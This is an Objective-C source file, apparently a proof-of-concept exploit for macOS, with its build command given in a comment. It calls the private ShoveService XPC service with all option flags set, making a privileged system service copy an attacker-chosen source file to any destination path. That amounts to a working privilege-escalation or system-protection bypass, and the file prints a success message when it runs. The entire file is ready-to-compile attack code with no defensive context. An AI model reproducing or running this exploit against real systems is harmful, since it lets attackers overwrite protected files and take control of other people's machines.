// clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/PackageKit.tbd

#import <Foundation/Foundation.h>

@interface PKShoveOptions : NSObject
- (void) setSourcePath:(NSURL *) src;
- (void) setDestPath:(NSURL *) dst;
- (void) setOptionFlags:(uint64_t) flags;
@end

@protocol SVShoveServiceProtocol
- (void)shoveWithOptions:(id)options completionHandler:(id) reply;
@end

int main(int argc, const char * argv[]) {
    if (argc != 3) {
        printf("%s /path/to/src /path/to/dst\n", argv[0]);
        return -1;
    }
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/ShoveService.framework/"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.installandsetup.ShoveService.System"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SVShoveServiceProtocol)];
    [conn resume];

    id options = [[PKShoveOptions alloc] init];
    [options setSourcePath:[NSURL fileURLWithFileSystemRepresentation:argv[1] isDirectory:FALSE relativeToURL:nil]];
    [options setDestPath:[NSURL fileURLWithFileSystemRepresentation:argv[2] isDirectory:FALSE relativeToURL:nil]];
    [options setOptionFlags:0xffffffff];
    [[conn remoteObjectProxy] shoveWithOptions:options completionHandler:nil];
    
    printf("exploit successfully :D press enter to exit.\n");
    getchar();
    return 0;
}
